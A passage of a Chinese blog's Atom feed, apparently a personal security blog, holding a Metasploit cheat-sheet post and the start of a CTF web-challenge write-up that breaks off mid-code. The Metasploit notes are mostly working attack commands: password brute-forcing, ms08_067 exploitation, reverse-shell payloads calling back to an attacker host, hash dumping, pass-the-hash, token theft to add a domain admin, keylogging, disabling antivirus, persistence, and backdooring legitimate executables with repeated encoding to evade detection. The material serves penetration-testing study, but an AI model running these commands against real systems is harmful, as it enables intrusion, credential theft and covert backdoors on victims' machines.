        &lt;h4 id=&quot;CBC字节翻转攻击&quot;&gt;&lt;a href=&quot;#CBC字节翻转攻击&quot; class=&quot;headerlink&quot; title=&quot;CBC字节翻转攻击&quot;&gt;&lt;/a&gt;CBC字节翻转攻击&lt;/h4&gt;&lt;h5 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ctf" scheme="http://yoursite.com/child/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit 整理笔记</title>
    <link href="http://yoursite.com/child/2018/06/12/Metasploit%20%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0(%E6%9B%B4%E6%96%B0%E4%B8%AD)/"/>
    <id>http://yoursite.com/child/2018/06/12/Metasploit 整理笔记(更新中)/</id>
    <published>2018-06-12T03:35:12.000Z</published>
    <updated>2018-06-13T13:21:53.085Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一．名词解释"><a href="#一．名词解释" class="headerlink" title="一．名词解释"></a>一．名词解释</h4><h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><p>测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的有内存溢出，网站程序漏洞利用，配置错误exploit。  </p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p>我们想让被攻击系统执行的程序，如reverse shell 可以从目标机器与测试者之间建立一<br>个反响连接，bind shell     绑定一个执行命令的通道至测试者的机器。payload 也可以是只能在目标机器上执行有限命令的程序 。  </p><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可执行命令的shell。</p><h5 id="module"><a href="#module" class="headerlink" title="module"></a>module</h5><p>MSF 的模块，由一系列代码组成。    </p><h5 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h5><p>等待来自被攻击机器的incoming连接的监听在测试者机器上的程序  </p><h4 id="二-编码器"><a href="#二-编码器" class="headerlink" title="二. 编码器"></a>二. 编码器</h4><p>msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai  </p><h4 id="三．信息刺探与收集"><a href="#三．信息刺探与收集" class="headerlink" title="三．信息刺探与收集"></a>三．信息刺探与收集</h4><h5 id="1、攻击第一步：基础信息收集"><a href="#1、攻击第一步：基础信息收集" class="headerlink" title="1、攻击第一步：基础信息收集"></a>1、攻击第一步：基础信息收集</h5><p>①whois 查询：<br>msf &gt; whois example.com<br>msf&gt; whois 192.168.1.100  </p><p>②在线手机服务器IP工具  </p><p>③nslookup<br>set type=mx<br>example.com  </p><h5 id="2、用nmap-探测开放端口和服务："><a href="#2、用nmap-探测开放端口和服务：" class="headerlink" title="2、用nmap 探测开放端口和服务："></a>2、用nmap 探测开放端口和服务：</h5><p>-sS SYN 半开扫描<br>-sT TCP 半开扫描<br>-Pn 不使用ping方式探测主机<br>-A 探测服务类型<br>-6 开启IPV6 扫描<br>-O 探测操作系统版本  </p><p>常用扫描参数组合：<br>nmap –sS –Pn 192.168.0.111<br>nmap –sS –Pn –A 192.168.0.111   </p><h5 id="3、MSF-与postgresql-协同工作"><a href="#3、MSF-与postgresql-协同工作" class="headerlink" title="3、MSF 与postgresql 协同工作"></a>3、MSF 与postgresql 协同工作</h5><p>/etc/init.d/postgreql-8.3 start<br>msf&gt; db_connect postgres:<a href="mailto:&#116;&#x6f;&#111;&#x72;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#49;">&#116;&#x6f;&#111;&#x72;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#49;</a>/msf<br>msf&gt; db_status<br>导入nmap 扫描的结果：<br>nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24 #   -oX 扫描结果导出为Subnet1.xml   </p><p>msf&gt; db_import Subnet1.xml  </p><p>msf&gt; db_hosts –c address #查看导入的主机IP<br>（msf 也可以和mysql 一起工作，在bt5 r1 中msf 默认支持连接mysql：<br>msf&gt; db_driver mysql<br>msf&gt; db_connect root:<a href="mailto:&#116;&#x6f;&#111;&#x72;&#x40;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;">&#116;&#x6f;&#111;&#x72;&#x40;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;</a>/msf3    #连接本机mysql 的msf3 数据库<br>mysql 默认密码toor，使用db_connect连接时会自动创建msf3 库）</p><h5 id="4、高级扫描方式："><a href="#4、高级扫描方式：" class="headerlink" title="4、高级扫描方式："></a>4、高级扫描方式：</h5><p>①msf&gt; use auxiliary/scanner/ip/ipidseq #IPID 序列扫描器，与nmap 的-sI -O 选项类似<br>show options<br>set RHOSTS 192.168.1.0/24<br>set RPORT 8080<br>set THREADS 50<br>run  （RHOSTS、RPORT 等参数也可以用小写）<br>②msf&gt; nmap –PN –sI 192.168.1.09 192.168.1.155<br>③nmap 连接数据库：<br>msf&gt; db_connect postgres:<a href="mailto:&#x74;&#x6f;&#111;&#x72;&#x40;&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#x2e;&#49;">&#x74;&#x6f;&#111;&#x72;&#x40;&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#x2e;&#49;</a>/msf<br>msf&gt; db_nmap –sS –A 192.168.1.111<br>msf&gt; db_services #查看扫描结果<br>④使用portscan 模块：<br>msf&gt; search postscan<br>msf&gt; use scanner/postscan/syn<br>set RHOSTS 192.168.1.111<br>set THREADS 50<br>run  </p><h5 id="5、特定扫描："><a href="#5、特定扫描：" class="headerlink" title="5、特定扫描："></a>5、特定扫描：</h5><p>smb_version 模块：<br>msf&gt; use auxiliary/scanner/smb/smb_version<br>show options<br>set RHOSTS 192.168.1.111<br>run<br>db_hosts –c address,os_flavor<br>查找mssql 主机：<br>msf&gt; use auxiliary/scanner/mssql/mssql_ping<br>show options<br>set RHOSTS 192.168.1.0/24<br>set THREADS 255<br>run  </p><p>SSH 服务器扫描：<br>msf&gt; use auxiliary/scanner/ssh/ssh_version<br>set THREADS 50<br>run   </p><p>FTP 主机扫描：<br>msf&gt; use auxiliary/scanner/ftp/ftp_version<br>show options<br>set RHOSTS 192.168.1.0/24<br>set THREADS 255<br>run   </p><p>扫描FTP 匿名登录：<br>use auxiliary/scanner/ftp/anonymos<br>set RHOSTS 192.168.1.0/24<br>set THREADS 50<br>run   </p><p>扫描SNMP 主机：<br>msf&gt; use auxiliary/scanner/snmp/snmp_login<br>set RHOSTS 192.168.1.0/24<br>set THREADS 50<br>run  </p><h4 id="四．基本漏洞扫描"><a href="#四．基本漏洞扫描" class="headerlink" title="四．基本漏洞扫描"></a>四．基本漏洞扫描</h4><h5 id="1、使用nc与目标端口通信，获取目标端口的信息："><a href="#1、使用nc与目标端口通信，获取目标端口的信息：" class="headerlink" title="1、使用nc与目标端口通信，获取目标端口的信息："></a>1、使用nc与目标端口通信，获取目标端口的信息：</h5><p>nc 192.168.1.111 80<br>GET HTTP 1/1<br>Server: Microsoft-IIS/5.1<br>（1：还有一个功能与nc 类似的工具Ncat，产自nmap 社区，可实现相同功能：<br>ncat -C 192.168.1.111 80<br>GET / HTTP/1.0  </p><p>2：题外：ncat   还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l –chat 其他客户端：ncat chatserver   </p><p>3：ncat 还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：<br>服务器（server.example.com）上：<br>ncat -l   –keep-open 80 –output caidao.log &gt; /dev/null<br>然后使用菜刀连接<a href="http://server.example.com/nc.php">http://server.example.com/nc.php</a> 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，–output 换为–hex-dump就可以了。  </p><p>4：其实与nc 功能类似的工具在kali里面还有很多，比如还有一个sbd：<br>监听：sbd -l -p 12345<br>连接：sbd 192.168.1.111 12345  </p><p>5：当然也可以用来聊天，与ncat的不同之处在于ncat 自动对用户编号user1、user2、…，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：<br>pc1：sbd -l -p 12345 -P chowner<br>pc2：sbd pc1 12345 -P evil  </p><p>6：其实nc 也可以用来聊天的：<br>pc1：nc -l -p 12345<br>pc2:telnet pc1 12345）  </p><h5 id="3、与nessus-结合扫描："><a href="#3、与nessus-结合扫描：" class="headerlink" title="3、与nessus 结合扫描："></a>3、与nessus 结合扫描：</h5><p>使用Nessus 扫描完成后生成.nessus格式的报告，导入到MSF：<br>db_connect postgres:<a href="mailto:&#x74;&#111;&#x6f;&#x72;&#64;&#49;&#50;&#55;&#46;&#x30;&#x2e;&#x30;&#46;&#49;">&#x74;&#111;&#x6f;&#x72;&#64;&#49;&#50;&#55;&#46;&#x30;&#x2e;&#x30;&#46;&#49;</a>/msf<br>db_import /tmp/nessus_report_Host_test.nessus<br>db_hosts –c address,svcs,vulns<br>db_vulns<br>在MSF 中使用Nessus：<br>db_connect postgres:<a href="mailto:&#116;&#111;&#111;&#114;&#64;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#49;">&#116;&#111;&#111;&#114;&#64;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#49;</a>/msf<br>load nessus<br>nessus_connect nessus:<a href="mailto:&#x74;&#x6f;&#111;&#114;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#46;&#49;&#49;&#x31;">&#x74;&#x6f;&#111;&#114;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#46;&#49;&#49;&#x31;</a>:8834   ok<br>nessus_policy_list #查看存在的扫描规则<br>nessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称<br>nessus_scan_status #查看扫描进行状态<br>nessus_report_list #查看扫描结果<br>nessus_report_get skjla243-3b5d-* #导入报告<br>db_hosts –c address,svcs,vulns  </p><h5 id="4、特殊扫描："><a href="#4、特殊扫描：" class="headerlink" title="4、特殊扫描："></a>4、特殊扫描：</h5><p>SMB 弱口令:<br>msf&gt; use auxiliary/scanner/smb/smb_login<br>set RHOSTS 192.168.1.111-222<br>set SMBUser Administrator<br>set SMBPass admin<br>run  </p><p>VNC 空口令：<br>msf&gt; use auxiliary/scanner/vnc/vnc_none_auth<br>set RHOSTS 192.168.1.111<br>run  </p><p>Open X11 空口令：<br>msf&gt; use auxiliary/scanner/x11/open_x11<br>set RHOST 192.168.1.0/24<br>set THREADS 50<br>run  </p><p>当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：<br>cd /pentest/sniffers/xspy/<br>./xspy –display 192.168.1.125:0 –delay 100  </p><h4 id="五．基础溢出命令"><a href="#五．基础溢出命令" class="headerlink" title="五．基础溢出命令"></a>五．基础溢出命令</h4><h5 id="1、基本命令："><a href="#1、基本命令：" class="headerlink" title="1、基本命令："></a>1、基本命令：</h5><p>查看可用溢出模块show exploits<br>查看辅助模块show auxiliary    包括扫描器，拒绝服务模块，fuzzer 工具或其他<br>查看可用选项show options  </p><p>加载模块后退出此模块back<br>例子：<br>msf&gt; use windows/smb/ms08_067_netapi<br>back  </p><p>搜索模块search<br>例子： searh mssql search ms08_067<br>查看当前模块可用的payload： show payloads<br>例子：<br>use windows/smb/ms08_067_netapi<br>show payloads<br>set payload windows/shell/reverse_tcp<br>show options<br><strong>查看可选的目标类型</strong>show targets<br><strong>查看更多信息</strong>info<br>设置一个选项或取消设置set/unset<br>设置或取消全局选项setg/unsetg 例如设置LHOST 就可以用setg，避免后面重复设置<br>保存全局选项的设置save 当下次启动仍然生效<br>查看建立的session sessions –l<br>激活session sessions –i num #num 为session 编号  </p><h5 id="2、暴力端口探测："><a href="#2、暴力端口探测：" class="headerlink" title="2、暴力端口探测："></a>2、暴力端口探测：</h5><p>当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。<br>例子：<br>use exploit/windows/smb/ms08_067_netapi<br>set LHOST 192.168.1.111<br>set RHOST 192.168.1.122<br>set TARGET 39 #Windows XP SP3 Chinese -Simplified (NX)<br>search ports #搜索与ports 相关模块<br>set PAYLOAD windows/meterpreter/reverse_tcp_allports<br>exploit –j #作为后台任务运行<br>sessions –l –v<br>sesssions –i 1   </p><h5 id="3、MSF-脚本文件："><a href="#3、MSF-脚本文件：" class="headerlink" title="3、MSF 脚本文件："></a>3、MSF 脚本文件：</h5><p>为了缩短测试时间可以将msf命令写入一个文件，然后在msf 中加载它。加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项  </p><h4 id="六．METERPRETER"><a href="#六．METERPRETER" class="headerlink" title="六．METERPRETER"></a>六．METERPRETER</h4><h5 id="1、当对目标系统进行溢出时，使用meterpreter-作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。"><a href="#1、当对目标系统进行溢出时，使用meterpreter-作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。" class="headerlink" title="1、当对目标系统进行溢出时，使用meterpreter 作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。"></a>1、当对目标系统进行溢出时，使用meterpreter 作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。</h5><p>例子：<br>msf&gt; nmap –sT –A –P0 192.168.1.130   #探测开放服务<br>假如已经探测到1433（TCP）和1434(UDP)端口（mssql），<br>msf&gt; nmap –sU 192.168.1.130 –P 1434   #确认端口开放<br>msf&gt; use auxiliary/scanner/mssql/mssql_ping<br>show options<br>set RHOSTS 192.168.1.1/24<br>set THREADS 20<br>exploit<br>至此可获取服务器名称，版本号等信息。<br>msf&gt; use auxiliary/scanner/mssql/mssql_login<br>show options<br>set PASS_FILE   /pentest/exploits/fasttrack/bin/dict/wordlist.txt<br>set RHOSTS 192.168.1.130<br>set THREADS 10<br>set verbose false<br>exploit<br>暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell 功能添加账户：<br>msf&gt; use exploit/windows/mssql/mssql_payload<br>show options<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.111<br>set LPORT 433<br>set RHOST 192.168.1.130<br>set PASSWORD password130<br>exploit<br>当获取到一个meterpreter shell后可以执行更多的操作：获取屏幕截图：screenshot<br>获取系统信息：sysinfo<br>获取键盘记录：<br>meterpreter&gt; ps   </p><p>#查看目标机器进程，假设发现explorer.exe的进程号为1668:<br>meterpreter&gt; migrate 1668 #插入该进程<br>meterpreter&gt; run   post/windows/capture/keylog_recorder #运行键盘记录模块，将击键记录保存到本地txt<br>cat /root/.msf3/loot/*.txt #查看结果  </p><p>获取系统账号密码：<br>meterpreter&gt; use priv<br>meterpreter&gt; run post/windows/gather/hashdump<br>当获取到密码的hash之后无法破解出明文密码且无法直接使用hash 登陆，需要使用pass-the-hash 技术  ：<br>msf&gt; use windows/smb/psexec<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.111<br>set LPORT 443<br>set RHOST 192.168.1.130<br>set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29<br>exploit<br>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：  </p><p>在目标机器上执行：net uaer hacker pass /add<br>本地生成一个后门程序：<br>msfpayload windows/meterpreter/reverse_tcp<br>LHOST=192.168.1.111 LPORT=443 X &gt;payload.exe<br>将payload.exe拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接：<br>msfcli multi/handler    PAYLOAD=windows/meterpreter/reverse_tcp<br>LHOST=192.168.1.111 LPORT=443<br>use priv<br>getsystem<br>getuid<br>至此取得SYSTEM 权限   </p><h5 id="2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。"><a href="#2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。" class="headerlink" title="2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。"></a>2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。</h5><p>meterpreter&gt; ps #    查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380<br>meterpreter&gt; steal_token 380<br>有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可用token：<br>meterpreter&gt; use incognito<br>meterpreter&gt; list_tokens –u    #列出可用token，假如找到域控token<br>meterpreter&gt; impersonate_token    SNEAKS.IN\ihazdomainadmin<br>meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户<br>meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组   </p><h5 id="3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机："><a href="#3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：" class="headerlink" title="3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机："></a>3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：</h5><p>例子：<br>meterpreter&gt; run get_local_subnets #查看网段/子网<br>Local subnet: 192.168.33.0/255.255.255.0<br>meterpreter&gt; background #转入后台运行<br>msf&gt; route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息<br>msf&gt; route print #查看添加的信息<br>msf&gt; use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻<br>set payload linux/x86/shell/reverse_tcp<br>set LHOST 10.10.1.129 #此处为attacking 主机的外网IP<br>set LPORT 8080<br>set RHOST 192.168.33.132 #内网目标主机<br>exploit<br>也可以使用自动式添加路由模块：<br>msf&gt; load auto_add_route<br>msf&gt; exploit  </p><h5 id="4、Meterpreter-脚本："><a href="#4、Meterpreter-脚本：" class="headerlink" title="4、Meterpreter 脚本："></a>4、Meterpreter 脚本：</h5><p>使用run scriptname 方式执行<br>①vnc 脚本,获取远程机器vnc 界面控制<br>meterpreter&gt; run vnc<br>meterpreter&gt; run screen_unlock<br>②进程迁移<br>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp   进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。<br>例子：<br>meterpreter&gt; run post/windows/manage/migrate<br>（在64 位win7 中migrate需要管理员权限执行后门才能成功，而migrate 前后获取的权限是有差异的。）<br>③关闭杀毒软件<br>meterpreter&gt; run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）<br>④获取系统密码hash<br>meterpreter&gt; run hashdump<br>（64 位win7 下需要管理员权限执行后门且先getsystem，然后使用run post/windows/gather/hashdump 来dump hash 成功率更高。而且如果要使用shell 添加系统账户的话win7 下得先：<br>run post/windows/escalate/bypassuac ，不然可能不会成功。）<br>⑤获取系统流量数据<br>meterpreter&gt; run packtrecorder –i 1<br>⑥直捣黄龙<br>可以干很多事情：获取密码，下载注册表，获取系统信息等<br>meterpreter&gt; run scraper<br>⑦持久保持<br>当目标机器重启之后仍然可以控制<br>meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111<br>-X 开机启动-i 连接超时时间–p 端口–rIP<br>下次连接时：<br>msf&gt; use multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set LPOST 443<br>set LHOST 192.168.1.111<br>exploit<br>(会在以下位置和注册表以随机文件名写入文件等信息，如：<br>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs<br>C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe<br>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)<br>⑧POST 整合模块<br>可实现同时多个session 操作<br>例子：获取hash<br>meterpreter&gt; run post/windows/gather/hashdump<br>其他还有很多，使用TAB 键补全看下就知道run post/   </p><h5 id="5、升级command-shell"><a href="#5、升级command-shell" class="headerlink" title="5、升级command shell"></a>5、升级command shell</h5><p>例子：<br>msfconsole<br>msf&gt; search ms08_067<br>msf&gt; use windows/smb/ms08_067_netapi<br>set PAYLOAD windows/shell/reverse_tcp<br>set TARGET 3<br>setg LHOST 192.168.1.111<br>setg LPORT 8080<br>exploit –z #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z 转到后台<br>sessions –u 1 #升级shell，必须前面使用setg 设定<br>sessions –i 2   </p><h5 id="6、使用Railgun-操作windows-APIs"><a href="#6、使用Railgun-操作windows-APIs" class="headerlink" title="6、使用Railgun 操作windows APIs"></a>6、使用Railgun 操作windows APIs</h5><p>例子：<br>meterpreter&gt; irb   </p><p> client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)<br>在目标机器上会弹出一个标题栏为world和内容为hello 的窗口  </p><h4 id="七．避开杀软"><a href="#七．避开杀软" class="headerlink" title="七．避开杀软"></a>七．避开杀软</h4><h5 id="1、使用msfpayload-创建可执行后门："><a href="#1、使用msfpayload-创建可执行后门：" class="headerlink" title="1、使用msfpayload 创建可执行后门："></a>1、使用msfpayload 创建可执行后门：</h5><p>例子：<br>msfpayload windows/shell_reverse_tcp 0 #查看选项<br>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X &gt;<br>/var/www/payload1.exe<br>然后本机监听端口<br>msf&gt; use exploit/multi/handler<br>show options<br>set PAYLOAD windows/shell_reverse_tcp<br>set LHOST 192.168.1.111<br>set LPORT 31337<br>exploit   </p><h5 id="2、过杀软—使用msfencode-编码后门："><a href="#2、过杀软—使用msfencode-编码后门：" class="headerlink" title="2、过杀软—使用msfencode 编码后门："></a>2、过杀软—使用msfencode 编码后门：</h5><p>msfencode –l #列出可用编码器<br>例子：<br>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R<br>|msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe<br>使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。   </p><h5 id="3、多次编码："><a href="#3、多次编码：" class="headerlink" title="3、多次编码："></a>3、多次编码：</h5><p>例子：<br>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |<br>msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw |<br>msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o<br>/var/www/payload3.exe<br>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。  </p><h5 id="4、自定义可执行程序模板："><a href="#4、自定义可执行程序模板：" class="headerlink" title="4、自定义可执行程序模板："></a>4、自定义可执行程序模板：</h5><p>msfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：<br>wget <a href="http://download.sysinternals.com/Files/ProcessExplorer.zip">http://download.sysinternals.com/Files/ProcessExplorer.zip</a><br>cd work<br>unzip ProcessExplorer.zip<br>cd ..<br>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode<br>–t exe –x work/procexp.exe –o/var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5<br>在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：<br>msfcli exploit/multi/handler   PAYLOAD=windows/shell_reverse_tcp   LHOST=192.168.1.111<br>LPORT=8080 E  </p><h5 id="5、暗度陈仓—猥琐执行payload："><a href="#5、暗度陈仓—猥琐执行payload：" class="headerlink" title="5、暗度陈仓—猥琐执行payload："></a>5、暗度陈仓—猥琐执行payload：</h5><p>绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例：<br>msfpayload windows/shell_reverse_tcp   LHOST=192.168.1.111 LPORT=8080 R | msfencode<br>–t exe –x putty.exe -o    /var/www/putty_backdoor.exe –e   x86/shikata_ga_nai –k –c 5<br>假如选择一个GUI界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd窗口，-k 选项的作用是payload独立于模板软件的进程运行。   </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;一．名词解释&quot;&gt;&lt;a href=&quot;#一．名词解释&quot; class=&quot;headerlink&quot; title=&quot;一．名词解释&quot;&gt;&lt;/a&gt;一．名词解释&lt;/h4&gt;&lt;h5 id=&quot;exploit&quot;&gt;&lt;a href=&quot;#exploit&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ctf" scheme="http://yoursite.com/child/tags/ctf/"/>
    
      <category term="MSF" scheme="http://yoursite.com/child/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>实验吧ctf题小计</title>
    <link href="http://yoursite.com/child/2018/06/01/%E5%AE%9E%E9%AA%8C%E5%90%A7%E5%B0%8F%E8%AE%A1/"/>
    <id>http://yoursite.com/child/2018/06/01/实验吧小计/</id>
    <published>2018-06-01T03:35:12.000Z</published>
    <updated>2018-06-03T13:45:16.995Z</updated>
    
    <content type="html"><![CDATA[<h3 id="实验吧ctf题小计"><a href="#实验吧ctf题小计" class="headerlink" title="实验吧ctf题小计"></a>实验吧ctf题小计</h3><h4 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h4><p>这道题给出提示<br>There is no martial art is indefectible, while the fastest speed is the only way for long success.<br>You must do it as fast as you can!<br>审查元素发现注释<br> please post what you find with parameter:key<br> 也就是我们需要post传参一个key值得到flag<br> bp抓包看一下<br> <img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frumcoseeqj310z09s40n.jpg" alt="image"><br> 响应头中有FLAGbase64编码，但是发现每一次请求都会改变base64值，所以我们需要写一个小脚本来快速抓取FLAG解码再post传参<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> # -*- coding: utf-8 -*</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">r&#x3D; requests.get(&quot;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;10&#x2F;10.php&quot;)</span><br><span class="line">r&#x3D;r.headers.get(&#39;FLAG&#39;)</span><br><span class="line">r&#x3D;base64.b64decode(r)</span><br><span class="line">print r[25:34]</span><br><span class="line">d &#x3D; &#123;&#39;key&#39;:r[25:34]&#125;</span><br><span class="line">r &#x3D; requests.post(&quot;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;10&#x2F;10.php&quot;, data&#x3D;d)</span><br><span class="line">print r.text</span><br></pre></td></tr></table></figure><br> 得到flag： CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}</p><h4 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h4><p>打开得到一坨[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!。。。。<br>这是JSFuck编码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">false       &#x3D;&gt;  ![]</span><br><span class="line">true        &#x3D;&gt;  !![]</span><br><span class="line">undefined   &#x3D;&gt;  [][[]]</span><br><span class="line">NaN         &#x3D;&gt;  +[![]]</span><br><span class="line">0           &#x3D;&gt;  +[]</span><br><span class="line">1           &#x3D;&gt;  +!+[]</span><br><span class="line">2           &#x3D;&gt;  !+[]+!+[]</span><br><span class="line">10          &#x3D;&gt;  [+!+[]]+[+[]]</span><br><span class="line">Array       &#x3D;&gt;  []</span><br><span class="line">Number      &#x3D;&gt;  +[]</span><br><span class="line">String      &#x3D;&gt;  []+[]</span><br><span class="line">Boolean     &#x3D;&gt;  ![]</span><br><span class="line">Function    &#x3D;&gt;  [][&quot;filter&quot;]</span><br><span class="line">eval        &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">window      &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://www.bugku.com/tools/jsfuck/">在线网站</a>解码得到flag：Ihatejs  </p><h4 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 